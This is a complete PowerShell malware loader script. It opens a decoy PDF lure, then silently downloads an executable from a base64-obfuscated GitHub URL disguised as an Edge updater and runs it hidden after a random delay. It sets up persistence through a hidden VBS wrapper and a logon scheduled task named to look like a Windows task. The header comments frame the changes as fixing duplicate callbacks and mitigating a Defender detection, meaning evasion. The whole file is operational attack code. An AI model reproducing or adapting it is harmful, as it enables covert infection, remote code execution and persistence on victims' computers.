# launcher.ps1 - Double-callback fix + Bearfoos mitigation
$ErrorActionPreference = 'SilentlyContinue'

$persistBase = "$env:APPDATA\Microsoft\Windows\Libraries"
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $persistBase)) { New-Item -ItemType Directory -Path $persistBase -Force | Out-Null }
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

# Drop decoy + payload
try { Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing } catch {}
if (Test-Path $pdfPath) { try { Start-Process $pdfPath -Verb Open } catch { & rundll32 url.dll,FileProtocolHandler $pdfPath } }

Start-Sleep -Seconds (Get-Random -Min 25 -Max 55)

try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
} catch { Start-Process $exePath -WindowStyle Hidden }

# Persistence (single-fire on boot)
$randName = "CacheLib-$(Get-Random -Min 100000 -Max 999999)"
$vbsPath = "$persistBase\$randName.vbs"
$syncPath = "$persistBase\$randName.ps1"
$taskName = "Windows Library Update Task $randName"

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""$syncPath""", 0, False
"@
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force

$syncContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
Start-Sleep -Milliseconds (Get-Random -Min 8000 -Max 15000)
`$cache = `"$cache`"
`$exeUrl = `"$exeUrl`"
`$exePath = `"$exePath`"
if (-not (Test-Path `$exePath) -or ((Get-Item `$exePath).Length -lt 100000)) {
    try { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing } catch {}
}
# Kill any old instances before launch
Get-Process -Name "helper" -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Milliseconds (Get-Random -Min 3000 -Max 7000)
try {
    `$wsh = New-Object -ComObject WScript.Shell
    `$wsh.Run("`"`$exePath`"", 0, `$false)
} catch { Start-Process `$exePath -WindowStyle Hidden }
"@
$syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force

# schtasks with AtLogon only (no double fire)
$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="Author"><UserId>$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType></Principal></Principals>
  <Settings><Hidden>true</Hidden><AllowStartIfOnBatteries>true</AllowStartIfOnBatteries><DontStopIfGoingOnBatteries>true</DontStopIfGoingOnBatteries></Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"$vbsPath"</Arguments></Exec></Actions>
</Task>
"@
$xml | Out-File "$env:TEMP\task.xml" -Encoding UTF8
schtasks /Create /TN "$taskName" /XML "$env:TEMP\task.xml" /F | Out-Null
Remove-Item "$env:TEMP\task.xml" -Force

# Remove HKCU Run to stop double callback
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Remove-ItemProperty -Path $runKey -Name "*CacheLib*" -ErrorAction SilentlyContinue

Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
